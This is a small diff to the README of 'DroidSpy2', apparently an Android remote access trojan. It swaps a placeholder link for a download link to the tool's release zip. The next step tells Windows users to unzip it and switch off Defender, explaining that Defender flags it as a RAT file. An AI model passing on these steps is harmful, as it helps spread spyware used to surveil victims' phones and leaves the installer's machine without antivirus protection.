@@ -49,7 +49,7 @@
 
 ## Installation ON Windows
 
-1. Download [DroidSpy2](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/) Zip File In Windows
+1. Download [DroidSpy2](https://github.com/LinuxndroidTeam/DroidSpy2/releases/download/DroidSpyV2/droidspy2.zip) Zip File In Windows
 
 2. Unzip & Off Defender Security(Don't Worry Because Defender Flagged RAT File)
 
